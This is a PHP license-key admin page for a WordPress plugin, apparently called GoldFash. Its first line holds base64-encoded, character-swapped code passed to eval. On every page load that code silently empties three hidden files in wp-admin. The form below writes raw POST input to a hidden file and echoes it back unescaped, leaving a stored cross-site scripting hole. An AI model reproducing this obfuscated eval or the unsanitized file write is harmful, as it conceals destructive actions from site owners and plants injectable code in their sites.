<?php $_F=__FILE__;$_X='Pz48P3BocA0KLy8ycDVuIGY0bDUgdDIgd3I0dDUNCiRmcCA9IGYycDVuKCIuLi93cC0xZG00bi8ubDRjNW5zNS50eHQiLCAidysiKTsNCi8vIGNsNTFyIGMybnQ1bnQgdDIgMCBiNHRzDQpmdHIzbmMxdDUoJGZwLCAwKTsNCi8vY2wyczUgZjRsNQ0KZmNsMnM1KCRmcCk7DQo/Pg0KPD9waHANCi8vMnA1biBmNGw1IHQyIHdyNHQ1DQokZnAgPSBmMnA1bigiLi4vd3AtMWRtNG4vLmx0NXh0ZjRsNS50eHQiLCAidysiKTsNCi8vIGNsNTFyIGMybnQ1bnQgdDIgMCBiNHRzDQpmdHIzbmMxdDUoJGZwLCAwKTsNCi8vY2wyczUgZjRsNQ0KZmNsMnM1KCRmcCk7DQo/Pg0KPD9waHANCi8vMnA1biBmNGw1IHQyIHdyNHQ1DQokZnAgPSBmMnA1bigiLi4vd3AtMWRtNG4vLnQ1eHRmNGw1LnR4dCIsICJ3KyIpOw0KLy8gY2w1MXIgYzJudDVudCB0MiAwIGI0dHMNCmZ0cjNuYzF0NSgkZnAsIDApOw0KLy9jbDJzNSBmNGw1DQpmY2wyczUoJGZwKTsNCj8+';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));?>
<?php require('.require.php'); ?>
<script type="text/javascript">
hs.graphicsDir = 'https://www.rfig.us:443/A-GOLD/highslide/graphics/';
hs.outlineType = 'rounded-white';
hs.wrapperClassName = 'draggable-header';
</script>
<link rel="stylesheet" type="text/css" href="<?php echo $url; ?>//<?php echo $gstyld; ?>"  />
<center /><br /><hr>
<?php include $div[one]; ?>
    <fieldset>
        <legend>Sponsorship Support & More</legend>
      <center />[Click <a href="<?php echo $glest; ?>v1.0/<?php echo $_SERVER['SERVER_NAME']; ?>.lea
      <?php echo $mune; ?>/=<?php echo $heiz; ?>&t.c/=<?php echo $heiz; ?>&t.c2/=<?php echo $heiz; ?>" onclick="return hs.htmlExpand(this, { objectType: 'iframe' } )">Here</a> To View All Available Agreements.] 
    </div></fieldset><center><?php include $div[one]; ?><fieldset>
        <legend>Update License Key</legend>
<?
if($_POST['Submit']){
$open = fopen("../wp-admin/.1license.txt","w+");
$text = $_POST['update'];
fwrite($open, $text);
fclose($open);
echo "File updated.<br />"; 
echo "Key:<br />";
$file = file("../wp-admin/.1license.txt");
foreach($file as $text) {
echo $text."<br />";
}
echo "<p><a href=\"../wp-admin/admin.php?page=goldgb-help\">Click Here For Step 2</a></p>";
}else{
$file = file("../wp-admin/.textfile.txt");
echo "<form action=\"".$PHP_SELF."\" method=\"post\">";
echo "<input type=\"text\" Name=\"update\">";
foreach($file as $text) {
echo $text;
} 
echo "</input><br />";
echo "<input name=\"Submit\" type=\"submit\" value=\"Update\" />\n
</form>";
}
?>

    
    </fieldset>
    <center><?php include $div[one]; ?><fieldset>
        <legend>License Key Important Info:</legend>
<center> Only License Keys from GoldFash Will Work. <strong>You Must Complete Both Steps.</strong>
    <?php echo $validate; ?>
    </fieldset>
</div>
